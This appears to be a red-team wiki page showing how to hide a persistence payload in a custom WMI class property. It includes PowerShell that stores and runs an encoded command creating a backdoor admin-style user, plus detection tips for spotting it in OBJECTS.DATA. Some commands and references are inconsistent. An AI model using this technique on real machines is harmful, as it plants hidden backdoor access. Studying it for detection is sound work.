---
description: >-
  Exploring WMI as a data storage for persistence by leveraging WMI classes and
  their properties.
---

# WMI Data Storage

## Execution

Creating a new WMI class with a property `EvilProperty` that will later store the payload to be executed:

```csharp
$evilClass = New-Object management.managementclass('root\cimv2',$null,$null)
$evilClass.Name = "Evil"
$evilClass.Properties.Add('EvilProperty','Tis notin good sir')
$evilClass.Put()

Path          : \\.\root\cimv2:Evil
RelativePath  : Evil
Server        : .
NamespacePath : root\cimv2
ClassName     : Evil
IsClass       : True
IsInstance    : False
IsSingleton   : False
```

We can see the `Evil` class' properties:

```csharp
([wmiclass] 'Evil').Properties

Name       : EvilProperty
Value      : Tis notin good sir
Type       : String
IsLocal    : True
IsArray    : False
Origin     : Evil
Qualifiers : {CIMTYPE}
```

Checking WMI explorer shows the new `Evil` class has been created under the `root\cimv2` namepace - note the `EvilProperty` can also be observed:

![](../../.gitbook/assets/wmi-data-storage-newclass.png)

### Storing Payload

For storing the payload inside the EvilPropertty, let's create a powershell base64 encoded command to add a backdoor user with credentials `backdoor:backdoor`:

```csharp
$command = "cmd '/c net user add backdoor backdoor /add'"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

# $encodedCommand = YwBtAGQAIAAvAGMAIAAnAG4AZQB0ACAAdQBzAGUAcgAgAGIAYQBjAGsAZABvAG8AcgAgAGIAYQBjAGsAZABvAG8AcgAgAC8AYQBkAGQAJwA=
```

Updating `EvilProperty` attribute to store `$encodedCommand`:

```csharp
$evilClass.Properties.Add('EvilProperty', $encodedCommand)
```

Below is the same as above, just in screenshots:

![](../../.gitbook/assets/wim-setting-payload.png)

### Real Execution

```csharp
powershell.exe -enc $evilClass.Properties['EvilProperty'].Value
```

Executing the payload stored in the property of a WMI class's property - note that the backdoor user has been successfully added:

![](../../.gitbook/assets/wmi-payload-executed.png)

If we commit the `$evilClass` with its `.Put()` method, our payload will get stored permanently in the WMI Class. Note how a new "Evil" class' properties member shows the payload we have commited:

![](../../.gitbook/assets/wmi-payload-commited.png)

## Observations

Using the WMI Explorer, we can inspect the class' definition which is stored in`%SystemRoot%\System32\wbem\Repository\OBJECTS.DATA` 

The file contains all the classes and other relevant information about those classes. In our case, we can see the `EvilProperty` with our malicious payload:

![](../../.gitbook/assets/wmi-evil-mof.png)

Inspecting the OBJECTS.DATA with a hex editor, it is possible \(although not very practicle\) to find the same data:

![](../../.gitbook/assets/wmi-objects-data.png)

We can get a pretty good insight into the bindings with the following command:

```csharp
strings OBJECTS.DATA | grep -i filtertoconsumerbinding -A 3 --color
```

Below are the results and we can easily see that one binding connects two evils - the evil consumer and the evil filter - see highlighted:

![](../../.gitbook/assets/wmi-strings-grep.png)

Now that you know that you are dealing with `evil` filter and consumer, try  another rudimentary piped command:

```csharp
strings OBJECTS.DATA | grep -i 'evil' -B3 -A2 --color
```

Note how we can get a pretty decent glimpse into the activity - note the `shell.cmd`, and the `SELECT * FROM` ... - if you recall, this is what we put in our consumers and filters at the very beginning:

![](../../.gitbook/assets/wmi-strings-grep2.png)

